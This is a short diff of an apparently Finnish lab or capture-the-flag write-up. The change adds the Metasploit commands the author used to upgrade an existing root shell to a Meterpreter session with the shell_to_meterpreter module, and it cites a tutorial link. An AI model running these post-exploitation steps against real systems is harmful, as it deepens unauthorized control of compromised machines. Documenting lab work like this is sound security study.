@@ -151,7 +151,16 @@ Lopuksi ajoin id. Näkyy root.
 
 Ohjeet: https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646
 
-Päivitin session meterpreter sessioksi.
+Päivitin session meterpreter sessioksi. Ajoin komennot:
+CTRL + Z y
+search shell_to_meterpreter
+use 0
+sessions -l
+show options
+set SESSION 1
+run
+session -1 2
+
 
 
 
